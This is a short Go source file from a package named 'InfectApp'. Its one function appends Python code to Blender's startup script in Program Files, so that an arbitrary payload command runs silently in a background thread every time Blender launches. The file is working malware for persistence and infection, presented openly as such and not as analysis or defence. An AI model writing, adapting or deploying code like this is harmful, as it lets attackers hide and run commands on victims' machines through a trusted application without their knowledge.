package InfectApp

import (
	"log"
	"os"
)

//need admin right
//
//payload in python
func InfectBlender(payload string) {
	file, err := os.OpenFile("C:\\Program Files\\Blender Foundation\\Blender 3.2\\3.2\\scripts\\startup\\bl_ui\\__init__.py", os.O_APPEND|os.O_WRONLY, 0644)
	if err != nil {
		log.Println(err)
	}
	defer file.Close()
	if _, err := file.WriteString(`
import threading, os
def executionPayload():
	os.system("` + payload + `")
threading.Thread(target=executionPayload).start()
`); err != nil {
		log.Fatal(err)
	}
}
